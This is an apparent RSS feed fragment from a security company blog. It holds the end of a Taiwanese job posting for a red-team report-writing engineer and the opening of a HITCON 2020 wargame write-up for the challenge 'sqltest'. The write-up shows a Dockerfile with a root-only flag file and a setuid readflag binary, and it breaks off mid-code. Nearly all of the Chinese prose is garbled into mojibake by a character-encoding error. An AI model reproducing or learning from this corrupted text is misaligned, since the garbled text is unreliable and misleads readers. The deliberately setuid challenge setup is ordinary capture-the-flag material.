&lt;h3 id=&quot;Â∑•‰ΩúÂÖßÂÆπ&quot;&gt;Â∑•‰ΩúÂÖßÂÆπ&lt;/h3&gt;

&lt;p&gt;Âú®Êª≤ÈÄèÊ∏¨Ë©¶„ÄÅÁ¥ÖÈöäÊºîÁ∑¥Â∞àÊ°à‰∏≠Êìî‰ªªÈáçË¶ÅÁöÑÂæåÂã§Â∑•‰Ωú„ÄÇÈÄôÊúÉÊòØÊúÄÊ∏ÖÊ•öÂÖ®Â±ÄÊà∞Ê≥ÅÁöÑËßíËâ≤ÔºåÈúÄË¶ÅËßÄÂØü„ÄÅË®òÈåÑÊï¥È´îÊà∞Ê≥ÅÔºåÁ¥∞ÂøÉ‰∏îËÄêÂøÉÂú∞Êï¥ÁêÜÁπÅÈõúÁöÑÊà∞Â±ÄË≥áË®äÔºå‰∏¶‰∏îÊ®ÇÊñºËàá‰ΩúÊà∞Â§•‰º¥Ê∫ùÈÄöÁèæÊúâÊà∞Ê≥Å„ÄÇÊ™¢Ê∏¨ÁµêÊùüÂæåÈúÄË¶ÅÂ∞áÂÆåÊï¥ÁöÑÊà∞Ê≥ÅË≥áË®äÂíåÊ™¢Ê∏¨ÈÅéÁ®ã‰∏≠ÁôºÁèæÁöÑÂº±ÈªûÂΩôÊï¥ÊàêÂ†±ÂëäÂíåÁ∞°Â†±ÔºåËÆìÂÆ¢Êà∂Ê∏ÖÊ•öÁêÜËß£Âº±ÈªûÊäÄË°ìÁ¥∞ÁØÄËàáÊàêÂõ†Ôºå‰∏îÂèØ‰æùÊìöÊäÄË°ìÁ¥∞ÁØÄÈáçÁèæÂ∑≤ÁôºÁèæÁöÑÂº±ÈªûÔºåÊúÄÂæåÂçîÂä©Ê™¢Ê∏¨ÂÆ¢Êà∂ÁöÑ‰øÆË£úÁãÄÊ≥Å„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÂçîÂä©‰ΩúÊà∞ 40%
    &lt;ul&gt;
      &lt;li&gt;Êï¥Âêà‰ΩúÊà∞Ë≥áÊñôÔºåÈóúËÅØÊà∞Â†¥Ë≥áË®äÂçîÂä©ÈöäÂèãÊâæÂà∞Á™ÅÁ†¥Èªû&lt;/li&gt;
      &lt;li&gt;ËøΩËπ§ÊéåÊè°Êà∞Ê≥ÅÈÄ≤Â∫¶&lt;/li&gt;
      &lt;li&gt;Â∞àÊ°à‰∏≠ËàáÂÆ¢Êà∂ÂçîË™øÈõôÊñπÈúÄÊ±Ç&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÊúÉË≠∞ 10%
    &lt;ul&gt;
      &lt;li&gt;ÂèÉËàáÂ∞àÊ°àÁõ∏ÈóúÂïüÂãï„ÄÅÁµêÊ°àÊúÉË≠∞&lt;/li&gt;
      &lt;li&gt;ÊàêÊûúÁ∞°Â†±&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Êí∞ÂØ´ËàáË£Ω‰ΩúÂ†±ÂëäÊñá‰ª∂ 40%
    &lt;ul&gt;
      &lt;li&gt;Ë£Ω‰ΩúÂ†±ÂëäÊõ∏„ÄÅÁ∞°Â†±„ÄÅÊó•Ë™å&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Ê™¢Ê∏¨ (ÂàùÊ∏¨„ÄÅË§áÊ∏¨) 10%
    &lt;ul&gt;
      &lt;li&gt;Ê™¢Ê∏¨Âº±Èªû‰øÆË£ú&lt;/li&gt;
      &lt;li&gt;Ë§áÊ∏¨ÊôÇÁ®ãÂÆâÊéíËàáÂçîË™ø&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÊôÇÈñì&quot;&gt;Â∑•‰ΩúÊôÇÈñì&lt;/h3&gt;
&lt;p&gt;10:00 - 18:00 (‰∏≠Èñì‰ºëÊÅØ 1 Â∞èÊôÇ 13:00 - 14:00)&lt;/p&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÂú∞Èªû&quot;&gt;Â∑•‰ΩúÂú∞Èªû&lt;/h3&gt;
&lt;p&gt;Âè∞ÂåóÂ∏Ç‰∏≠Â±±ÂçÄÂæ©ËààÂåóË∑Ø 168 Ëôü 10 Ê®ì
ËøëÊúüÊúÉÊê¨ÈÅ∑Ëá≥Âè∞ÂåóÁî∞ÂæëÂ†¥ÈôÑËøëÔºàÊç∑ÈÅãÂè∞ÂåóÂ∞èÂ∑®ËõãÁ´ôÔºâ&lt;/p&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÊ¢ù‰ª∂Ë¶ÅÊ±Ç&quot;&gt;Â∑•‰ΩúÊ¢ù‰ª∂Ë¶ÅÊ±Ç&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ÁÜüÊÇâ OWASP Web Top 10„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ Microsoft Word Êàñ Mac Pages„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ Microsoft PowerPoint Êàñ Mac Keynote„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ BurpSuite ÊàñÂÖ∂‰ªñ HTTP Â∞ÅÂåÖ‰øÆÊîπÊîîÊà™Â∑•ÂÖ∑„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÊúâÁ®ãÂºè Debug ËÉΩÂäõÔºåËÉΩÈáçÁèæ‰∏¶Êî∂ÊñÇÂïèÈ°å„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâÁ∂≤È†ÅÁ®ãÂºèË™ûË®ÄÔºàÂ¶Ç PHP„ÄÅASPX„ÄÅJSPÔºâÔºåÊõæÂª∫Á´ãËá™Â∑±ÊàñÂà•‰∫∫Â∏∏Áî®ÁöÑÁ∂≤È†ÅÊúçÂãô„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ Scripting Ë™ûË®ÄÔºàÂ¶Ç ShellScript„ÄÅPython„ÄÅRubyÔºâÔºå‰ΩøÁî®ËÖ≥Êú¨Ëºî‰ª•Â∑•‰ΩúÔºå‰∫¶ËÉΩÁêÜËß£Â∞àÊ°àÊâÄÁî®ÁöÑÁõ∏ÈóúËÖ≥Êú¨„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ Command Line Êìç‰ΩúËºî‰ª•Â∑•‰ΩúÔºåÂåÖÂê´Âü∑Ë°å Unix-like Âíå Windows ÁöÑÁ≥ªÁµ±Êåá‰ª§„ÄÅÂ∑•ÂÖ∑Á≠âÔºå‰∫¶ËÉΩÁêÜËß£Â∞àÊ°àÊâÄÁî®ÁöÑÁõ∏ÈóúÊåá‰ª§„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ curl„ÄÅnetcat„ÄÅnmap„ÄÅDirb Á≠âÂÆâÂÖ®Ê∏¨Ë©¶Áõ∏ÈóúÂ∑•ÂÖ∑„ÄÇ&lt;/li&gt;
  &lt;li&gt;Êúâ‰ø°ÂøÉÂà∞ËÅ∑‰∏ÄÂπ¥ÂÖßÊãøÂà∞ Offensive Security Certified Professional (OSCP) Ë≠âÁÖßÊàñÊìÅÊúâÁ≠âÂÄºËÉΩÂäõ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;‰∫∫Ê†ºÁâπË≥™ÂÅèÂ•Ω&quot;&gt;‰∫∫Ê†ºÁâπË≥™ÂÅèÂ•Ω&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ÂÑ™ÁßÄÁöÑÊñáÂ≠óÁµÑÁπîËÉΩÂäõËàáÈÇèËºØÊÄùËÄÉÔºåÊáÇÂæóÈÄèÈÅéÊ∑∫È°ØÊòìÊáÇ‰∏îÊ¢ùÁêÜÊ∏ÖÊô∞ÁöÑÊñπÂºèÂÇ≥ÈÅîÂÖßÂÆπÁµ¶ÂÆ¢Êà∂ÊàñÂÖßÈÉ®ÂúòÈöä„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊìÅÊúâÂº∑Â§ßÁöÑÂ≠∏ÁøíËÉΩÂäõÔºåÂ∞çÊñº‰ªª‰Ωï‰∏çÊáÇÁöÑÊäÄË°ìÁ¥∞ÁØÄÈÉΩËÉΩ‰∏ªÂãïË©¢ÂïèÂêå‰∫ãÔºåÊÉ≥Ëæ¶Ê≥ïÁêÜËß£‰∏¶ÂÖßÂåñÊàêËá™Â∑±ÁöÑÁü•Ë≠ò„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊáÇÂæóÊ∫ùÈÄöÂÇæËÅΩÔºåËÉΩÂêåÁêÜ‰ªñ‰∫∫ÔºåÊâæÂá∫ÂΩºÊ≠§ÂÖ±Ë≠ò„ÄÇ&lt;/li&gt;
  &lt;li&gt;Á¥∞ÂøÉÂö¥Ë¨πÔºåËÉΩËÄêÂøÉÁöÑËôïÁêÜÁπÅÁë£ÁöÑÂ∫∂ÂãôÂ∑•‰Ωú„ÄÇ&lt;/li&gt;
  &lt;li&gt;‰∏ªÂãïÁ©çÊ•µÔºåÁúãÂà∞ÊàëÂÄëÊ≤íÁôºÁèæÁöÑÁ¥∞ÁØÄÔºåË∂ÖË∂äÊàëÂÄëÊâÄÊúüÊúõÁöÑÂü∫Ê∫ñ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ËâØÂ•ΩÁöÑÊôÇÈñìÁÆ°ÁêÜËÉΩÂäõÔºå‰æùÊìö‰ªªÂãôÁöÑÂÑ™ÂÖàÈ†ÜÂ∫èÔºåÊúâÊïàÁéáÁöÑÂÆåÊàêÊØèÈ†Ö‰∫§Ëæ¶„ÄÇ&lt;/li&gt;
  &lt;li&gt;Âú®ÂêÑÁ®ÆÂ∑•‰ΩúÁ¥∞ÁØÄ‰∏≠ÔºåÊâæÂà∞ÊúÄ‰Ω≥ÂåñÊµÅÁ®ãÁöÑÊñπÂºèÔºåÂπ´Âä©ÂúòÈöäÊõ¥ÊúâÊïàÁéáÁöÑÈÅã‰Ωú„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂãáÊñºÊé•ÂèóÊåëÊà∞‰∏îÂÖ∑ÂÇôËß£Ê±∫ÂïèÈ°åÁöÑËÉΩÂäõÔºåÂä™ÂäõÂÖãÊúçÊú™Áü•ÁöÑÈõ£È°å„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Âä†ÂàÜÊ¢ù‰ª∂&quot;&gt;Âä†ÂàÜÊ¢ù‰ª∂&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ÊõæÁ∂ìÊúâÊí∞ÂØ´ÈÅéÁõ∏ÈóúÁ¥ÖÈöäÊºîÁ∑¥„ÄÅÊª≤ÈÄèÊ∏¨Ë©¶‰∏≠„ÄÅËã±ÊñáÂ†±ÂëäÁ≠âÁ∂ìÈ©ó„ÄÇ&lt;/li&gt;
  &lt;li&gt;Â∑≤ËÄÉÈÅé Offensive Security Certified Professional (OSCP) Ë≠âÁÖß„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊõæÁ∂ìÊåñÊéòÂ∏∏Ë¶ãÊºèÊ¥ûÔºàÂ¶Ç XSS„ÄÅSQL Injection„ÄÅBroken Access ControlÔºâ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊõæÁ∂ìÂØ´ÈÅéÁõ∏Èóú CTF„ÄÅWargame ÊàñÂº±ÈªûÂõûÂ†±Á≠âÈ°ûÂûãÁöÑ Writeup„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊúâÊí∞ÂØ´ÊäÄË°ìÈ°ûÂûãÁ≠âÊñáÁ´†ÈÉ®ËêΩÊ†ºÁ∂ìÈ©ó„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÊúâÂ∞àÊ°àÁÆ°ÁêÜË¶èÂäÉÁöÑËÉΩÂäõ„ÄÇ&lt;/li&gt;
  &lt;li&gt;‰∏≠ÊñáÁõ≤ÊâìÂÖ∑ÂÇô TQC Â∞àÊ•≠Á¥öÊ∞¥Ê∫ñ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Â∑•‰ΩúÁí∞Â¢É&quot;&gt;Â∑•‰ΩúÁí∞Â¢É&lt;/h3&gt;
&lt;p&gt;Êñ∞Ëæ¶ÂÖ¨ÂÆ§Ë£ùÊΩ¢‰∏≠ÔºåÂèØÂèÉËÄÉ‰πãÂâçÁöÑ&lt;a href=&quot;https://devco.re/blog/2019/07/23/devcore-201907-recruit/&quot;&gt;ÂæµÊâçÊñá&lt;/a&gt;ÔºåÊú™‰æÜËæ¶ÂÖ¨ÂÆ§ÊúÉÂÑ™ÊñºÈÅéÂéª„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÂÖ¨Âè∏Á¶èÂà©&quot;&gt;ÂÖ¨Âè∏Á¶èÂà©&lt;/h3&gt;
&lt;p&gt;ÊàëÂÄëÊ≥®ÈáçÂÖ¨Âè∏ÊØè‰ΩçÂêå‰ªÅÁöÑË∫´ÂøÉÂÅ•Â∫∑ÔºåË´ãÂèÉËÄÉ‰ª•‰∏ãÁ¶èÂà©Âà∂Â∫¶Ôºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;‰ºëÂÅáÁ¶èÂà©
    &lt;ul&gt;
      &lt;li&gt;Âà∞ËÅ∑Âç≥ÂèØÈ†êÊîØÁï∂Âπ¥Â∫¶Áâπ‰ºë&lt;/li&gt;
      &lt;li&gt;ÊØèÂπ¥‰∫îÂ§©ÂÖ®Ëñ™ÁóÖÂÅá&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÁçéÈáëÁ¶èÂà©
    &lt;ul&gt;
      &lt;li&gt;‰∏âÁØÄÁ¶ÆÈáëÔºàÊò•ÁØÄ„ÄÅÁ´ØÂçàÁØÄ„ÄÅ‰∏≠ÁßãÁØÄÔºâ&lt;/li&gt;
      &lt;li&gt;ÁîüÊó•Á¶ÆÈáë&lt;/li&gt;
      &lt;li&gt;Â©öÂñ™Ë£úÂä©&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;‰ºëÈñíÁ¶èÂà©
    &lt;ul&gt;
      &lt;li&gt;Âì°Â∑•ÊóÖÈÅä&lt;/li&gt;
      &lt;li&gt;ËàíÂ£ìÊåâÊë©&lt;/li&gt;
      &lt;li&gt;Team Building&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÁæéÈ£üÁ¶èÂà©
    &lt;ul&gt;
      &lt;li&gt;Èõ∂È£üÈ£≤Êñô&lt;/li&gt;
      &lt;li&gt;Âì°Â∑•ËÅöÈ§ê&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÅ•Â∫∑Á¶èÂà©
    &lt;ul&gt;
      &lt;li&gt;Âì°Â∑•ÂÅ•Â∫∑Ê™¢Êü•&lt;/li&gt;
      &lt;li&gt;ÈÅãÂãï‰∏≠ÂøÉÂÅ•Ë∫´Âà∏&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÈÄ≤‰øÆÁ¶èÂà©
    &lt;ul&gt;
      &lt;li&gt;ÂÖßÈÉ®ÊïôËÇ≤Ë®ìÁ∑¥&lt;/li&gt;
      &lt;li&gt;Â§ñÈÉ®ÈÄ≤‰øÆË™≤Á®ã&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∂‰ªñ
    &lt;ul&gt;
      &lt;li&gt;Â∞àÊ•≠ÁöÑÂÖ¨Âè∏ÂúòÈöä&lt;/li&gt;
      &lt;li&gt;ÊâÅÂπ≥ÁöÑÂÖßÈÉ®ÁµÑÁπî&lt;/li&gt;
      &lt;li&gt;È†ÜÊö¢ÁöÑÊ∫ùÈÄöÊ∞õÂúç&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ëµ∑Ëñ™ÁØÑÂúç&quot;&gt;Ëµ∑Ëñ™ÁØÑÂúç&lt;/h3&gt;
&lt;p&gt;Êñ∞Âè∞Âπ£ 60,000 - 80,000 Ôºà‰øùË≠âÂπ¥Ëñ™ 14 ÂÄãÊúàÔºâ&lt;/p&gt;

&lt;h3 id=&quot;ÊáâÂæµÊñπÂºè&quot;&gt;ÊáâÂæµÊñπÂºè&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Ë´ãÂ∞áÊÇ®ÁöÑÂ±•Ê≠∑‰ª• PDF Ê†ºÂºèÂØÑÂà∞¬†recruiting@devco.re
    &lt;ul&gt;
      &lt;li&gt;Â±•Ê≠∑Ê†ºÂºèË´ãÂèÉËÄÉÁØÑ‰æãÁ§∫ÊÑèÔºà&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;Ôºâ‰∏¶ËΩâÊàê PDF„ÄÇËã•ÊÇ®ÊúâËá™‰ø°Ôºå‰πüÂèØ‰ª•Ëá™Áî±ÁôºÊèÆÊúÄËÉΩÂëàÁèæÊÇ®ËÉΩÂäõÁöÑÂ±•Ê≠∑„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Ê®ôÈ°åÊ†ºÂºèÔºö&lt;strong&gt;[ÊáâÂæµ] Á¥ÖÈöäÊºîÁ∑¥Â∑•Á®ãÂ∏´ ÊÇ®ÁöÑÂßìÂêç&lt;/strong&gt;ÔºàÁØÑ‰æãÔºö[ÊáâÂæµ] Á¥ÖÈöäÊºîÁ∑¥Â∑•Á®ãÂ∏´ ÁéãÂ∞èÁæéÔºâ&lt;/li&gt;
  &lt;li&gt;Â±•Ê≠∑ÂÖßÂÆπË´ãÂãôÂøÖÊéßÂà∂Âú®ÂÖ©È†Å‰ª•ÂÖßÔºåËá≥Â∞ëÈúÄÂåÖÂê´‰ª•‰∏ãÂÖßÂÆπÔºö
    &lt;ul&gt;
      &lt;li&gt;Âü∫Êú¨Ë≥áÊñô&lt;/li&gt;
      &lt;li&gt;Â≠∏Ê≠∑&lt;/li&gt;
      &lt;li&gt;Â∑•‰ΩúÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;Á§æÁæ§Ê¥ªÂãïÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;ÁâπÊÆä‰∫ãËπü&lt;/li&gt;
      &lt;li&gt;MBTI ËÅ∑Ê•≠ÊÄßÊ†ºÊ∏¨Ë©¶ÁµêÊûúÔºà&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;Ê∏¨Ë©¶Á∂≤È†Å&lt;/a&gt;Ôºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÈôÑË®ª&quot;&gt;ÈôÑË®ª&lt;/h3&gt;

&lt;p&gt;ÊàëÂÄëÊúÉÂú®ÂÖ©ÈÄ±ÂÖß‰∏ªÂãïËàáÊÇ®ËÅØÁπ´ÔºåÊãõÂãüÈÅéÁ®ã‰æùÂ∫èÁÇ∫Êõ∏Èù¢ÂØ©Ê†∏„ÄÅÁ∑ö‰∏äÊ∏¨È©ó‰ª•ÂèäÈù¢Ë©¶‰∏âÂÄãÈöéÊÆµ„ÄÇÁ¨¨‰∫åÈöéÊÆµÁöÑÁ∑ö‰∏äÊ∏¨È©óÊúÄÂø´Â∞áÊñº‰∏ÉÊúàÂ∫ïÈÄ≤Ë°åÔºåÁÖ©Ë´ãËÄêÂøÉÁ≠âÂÄôÔºõÁ¨¨‰∏âÈöéÊÆµÈù¢Ë©¶Ë¶ñÁñ´ÊÉÖÁãÄÊ≥ÅÂèØËÉΩÊúÉÊé°Á∑ö‰∏äÈù¢Ë©¶„ÄÇ
Ëã•ÊúâÊáâÂæµÁõ∏ÈóúÂïèÈ°åÔºåË´ã‰∏ÄÂæã‰ΩøÁî® Email ËÅØÁπ´ÔºåÈÄ†ÊàêÊÇ®ÁöÑ‰∏ç‰æøË´ãË¶ãË´í„ÄÇÊàëÂÄëÊÑüË¨ùÊÇ®ÁöÑ‰æÜ‰ø°ÔºåÊúüÂæÖÊÇ®ÁöÑÂä†ÂÖ•ÔºÅ&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2021/06/22/devcore-202106-recruit/</link>
                <guid>https://devco.re/blog/2021/06/22/devcore-202106-recruit</guid>
                <pubDate>Tue, 22 Jun 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE Wargame at HITCON 2020</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;p&gt;Êê≠ÊôöÂÆâÔΩû‰∏ÄÂπ¥‰∏ÄÂ∫¶ÁöÑË≥áÂÆâÂúàÂ§ßÊãúÊãúÊ¥ªÂãï‰πã‰∏Ä HITCON 2020 Âú®Á¥Ñ‰∏ÄÂÄãÊúàÂâçÈ†ÜÂà©ËêΩÂπïÂï¶Ôºå‰ªäÂπ¥ÊàëÂÄëÁÖßËàäÂú®Êî§‰ΩçÊ∫ñÂÇô‰∫ÜÂπæÈÅìÂ∞èÂ∞èÁöÑ Wargame Áµ¶ÊúÉÁúæÊúãÂèãÂÄëÊåëÊà∞Ëá™Ë∫´ÊäÄË°ìÔºå‰∏¶ÂêåÊ®£Ê∫ñÂÇô‰∫ÜÂπæ‰ªΩÁ≤æÁæéÂ∞èÁ¶ÆÁâ©ÈÄÅÁµ¶ÊåëÊà∞ÊàêÂäüÁöÑÊúãÂèãÂÄë„ÄÇ&lt;/p&gt;

&lt;p&gt;Á∏ΩË®àÊ¥ªÂãïÂÖ©Â§©ÈñìÊúâÁôªÂÖ•‰∏¶Êèê‰∫§Ëá≥Â∞ë‰∏ÄÊää flag ÁöÑ‰∫∫Êï∏ÁÇ∫ 92 ‰∫∫ÔºåÈùûÂ∏∏ÊÑüË¨ùÂ§ßÂÆ∂Ë∏¥Ë∫çÂú∞ÂèÉËàáÔºåÈÄôÊ¨°Êú™ËÉΩÊàêÂäüÂú®ÊôÇÈñìÂÖßÂÆåÊàêÊåëÊà∞ËÄåÊú™È†òÂà∞Â∞èÁ¶ÆÁâ©ÁöÑÊúãÂèãÂÄë‰πüÂà•Â§™ÁÅ∞ÂøÉÔºåÁÇ∫‰∫ÜËÉΩÊõ¥Â§öÁöÑÂõûÈ•ãÁ§æÁæ§ÔºåÊâÄ‰ª•ÊàëÂÄëÊ±∫ÂÆöÂØ´‰∏ÄÁØáÊäÄË°ìÊñáÁ´†‰ªãÁ¥πÊú¨Ê¨° Wargame ÁöÑÂÖ∂‰∏≠‰∏ÄÈÅìÈñãÊîæÂºèÈ°åÁõÆ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqltest&lt;/code&gt;ÔºåÁÇ∫Ê≠§ÊàëÂÄëÂú®Ê¥ªÂãïÂæåË©¢Âïè‰∫ÜÊâÄÊúâËß£È°åÁöÑ‰∫∫ÔºåÊî∂ÈõÜ‰∫ÜÂ§ßÂÆ∂ÁöÑËß£Ê≥ïËàáÊÄùË∑ØÔºå‰∏¶Â∞áÂú®ÊñáÁ´†ÁöÑÊé•‰∏ã‰æÜ‰∏Ä‰∏ÄÁÇ∫Â§ßÂÆ∂‰ªãÁ¥πÔºÅ&lt;/p&gt;

&lt;h2 id=&quot;sqltest-È°åÁõÆË™™Êòé&quot;&gt;sqltest È°åÁõÆË™™Êòé&lt;/h2&gt;

&lt;p&gt;ÈÄôÈÅìÈ°åÁõÆ‰∏ªË¶ÅÊ†∏ÂøÉÁöÑÈÉ®ÂàÜÂ∞±ÈÄô 3 ÂÄãÊ™îÊ°àÔºöDockerfile„ÄÅreadflag.c Âíå index.php„ÄÇËÆìÊàëÂÄëÂÖàÁúãÁúãÂâçÂÖ©ÂÄãÊ™îÊ°àÔºåÂèØ‰ª•Âæû‰∏ãÊñπÁöÑ Dockerfile ‰∏≠ÂÖàËßÄÂØüÂà∞ flag Ë¢´ÊîæÁΩÆÂú®Ê™îÊ°à /flag ‰πã‰∏≠Ôºå‰ΩÜÊ¨äÈôêË¢´Ë®≠ÂÆöÁÇ∫ÂÉÖÊúâ root ÂèØ‰ª•ËÆÄÂèñÔºåÂè¶Â§ñÊ∫ñÂÇô‰∫ÜÂÖ∑Êúâ setuid Ê¨äÈôêÁöÑÂü∑Ë°åÊ™î /readflagÔºåËÆì‰ªª‰Ωï‰∫∫ÂùáÂèØÂú®Âü∑Ë°åÊ≠§Ê™îÊ°àÊôÇÂÅΩË£ùÊàê root Ë∫´ÂàÜÔºåËÄå /readflag ÁöÑÂéüÂßãÁ¢ºÂ∞±Â¶Ç‰∏ãÊñπ readflag.c ÊâÄÁ§∫ÔºåÂæàÂñÆÁ¥îÁöÑËÆÄÂèñ‰∏¶Ëº∏Âá∫ /flag Ê™îÊ°àÂÖßÂÆπÔºåÈÄôÂÄãÈÖçÁΩÆÂ∞±ÊòØ‰∏ÄÂÄãÂæàÊ®ôÊ∫ñ‰ª• getshell ÁÇ∫ÁõÆÊ®ôÁöÑ Wargame È°åÁõÆ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Dockerfile&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-dockerfile highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; php:7.4.10-apache&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# setup OS env&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;apt update &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;docker-php-ext-install mysqli
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;docker-php-ext-enable mysqli

&lt;span class=&quot;c&quot;&gt;# setup web application&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; ./src/ /var/www/html/&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# setup flag&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DEVCORE{flag}&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /flag
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;0400 /flag
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;root:root /flag
&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; readflag.c /readflag.c&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /readflag /readflag.c
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;4555 /readflag
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;readflag.c&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;seteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
